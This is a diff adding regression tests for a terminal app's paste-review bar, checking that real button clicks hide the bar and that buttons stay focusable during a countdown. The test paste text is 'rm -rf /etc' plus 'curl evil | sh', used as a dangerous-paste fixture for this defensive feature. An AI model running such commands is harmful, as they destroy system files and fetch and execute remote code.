@@ -3239,6 +3239,44 @@ win._hide_paste_review(_tabB)                          # B resolves its OWN revi
 ok(win._review_bar.reviewed_term() is None,
    'a tab resolving its own review still hides the bar')
 
+# REAL-GUI regression (the tests above drive _show_review/_hide_paste_review DIRECTLY,
+# so they never exercised the real button-click -> _choose -> dispatch -> resolved ->
+# _hide_paste_review chain). Two bugs lived in that gap:
+#  (1) _choose clears the bar's _term before dispatching, so _hide_paste_review's
+#      reviewed_term()-is-term guard then SKIPPED hide_review() -- the bar stayed OPEN
+#      after a real click ("all buttons do nothing").
+#  (2) the send buttons were setEnabled(False) during the countdown, so a DISABLED
+#      button could not take focus -> focusing one to PREVIEW its delivered form did
+#      nothing. Drive real clicks + real focus in a SHOWN window (isVisible is only
+#      meaningful when the hierarchy is shown).
+from PyQt6.QtCore import QMimeData as _QMimeRB                  # noqa: E402
+_rbwin = MainWindow(); _rbwin.resize(900, 500); _rbwin.show(); pump()
+if _rbwin.tabs.count() == 0:
+    _rbwin.new_tab()
+_rbt = _rbwin.current(); _rbt.apply_paste_warn('unicode'); _rbt.apply_paste_delay(0); pump()
+_rbar = _rbwin._review_bar
+_rbm = _QMimeRB(); _rbm.setText('rm -rf /etc\ncurl evil | sh\n'); _rbt.insertFromMimeData(_rbm); pump()
+ok(_rbt.review_pending() and _rbar.reviewed_term() is _rbt and _rbar.isVisible(),
+   'a real multi-line paste shows the review bar')
+_rbar._reject.click(); pump()                                  # REAL click, not _hide_paste_review
+ok(not _rbt.review_pending(), 'the real Reject click dispatched the reject')
+ok(not _rbar.isVisible() and _rbar.reviewed_term() is None,
+   'the bar HIDES after a real button click (regression: the guard left it open)')
+
+# countdown: buttons stay ENABLED (focusable) so focus previews; a delivery CLICK is gated
+_rbt.apply_paste_delay(3)
+_rbm2 = _QMimeRB(); _rbm2.setText('rm -rf /etc\ncurl evil | sh\n'); _rbt.insertFromMimeData(_rbm2); pump()
+ok(_rbar._stripped.isEnabled() and _rbar._gated,
+   'a Paste button stays ENABLED during the countdown (gate up)')
+_rbar._stripped.setFocus(); pump()
+ok(_rbar._stripped.hasFocus() and _rbar._preview_action == 'stripped',
+   'focusing a Paste button during the countdown PREVIEWS its delivered form (regression)')
+_rbar._stripped.click(); pump()
+ok(_rbt.review_pending() and _rbar.isVisible(),
+   'clicking a delivery button during the countdown is a gated no-op (still reviewing)')
+_rbar._reject.click(); pump()
+_rbwin.close()
+
 # --- app.aboutToQuit teardown: shuts every window's tabs, tolerating a raise ---
 # main() connected _shutdown_all_tabs to app.aboutToQuit during the full-startup
 # runs above; fire it with a tab whose shutdown() raises to drive the
